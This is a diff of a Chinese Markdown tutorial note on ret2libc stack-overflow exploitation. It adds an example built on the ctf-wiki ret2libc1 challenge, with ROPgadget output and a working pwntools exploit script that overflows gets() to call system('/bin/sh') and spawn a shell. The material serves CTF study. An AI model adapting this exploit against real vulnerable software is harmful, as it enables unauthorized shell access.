@@ -1,4 +1,4 @@
-# 基本ROP-ret2libc(1)
+# **基本ROP-**ret2libc(1)
 
 > 参考：[ret2syscall-Cyberangel](https://www.yuque.com/cyberangel/rg9gdm/crpf61#h2-7) 
 >
@@ -10,6 +10,8 @@
 共享库libc.so中存在system()以及execve()，找到/bin/sh字符串，覆盖掉返回地址即可获得当前进程的控制权
 
 
+
+## 示例1
 
 **源码**
 
@@ -130,3 +132,57 @@ $ ls
 
 ```
 
+
+
+## 示例2
+
+> 参考：[ret2libc实战1-Cyberangel](https://www.yuque.com/cyberangel/rg9gdm/aikosg)
+>
+> 下载：[ret2libc1](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1)
+
+
+
+checksec发现是32位，开启NX保护
+
+扔进IDA发现容易栈溢出的gets函数，以及含有system()的secure()函数
+
+测算栈长度112
+
+
+
+**查找字符串/bin/sh**
+
+```shell
+$ ROPgadget --binary ret2libc1 --string '/bin/sh' 
+Strings information
+============================================================
+0x08048720 : /bin/sh
+```
+
+
+
+IDA查看system()地址
+
+
+
+**EXP**
+
+正常调用system函数有一个对应的返回地址，这里以虚假地址bbbb提交，后面参数对应参数内容
+
+```shell
+#!/usr/bin/env python
+from pwn import *
+
+sh = process('./ret2libc1')
+
+binsh_addr = 0x8048720
+system_plt = 0x08048460
+payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])
+sh.sendline(payload)
+
+sh.interactive()
+```
+
+
+
+成功getshell
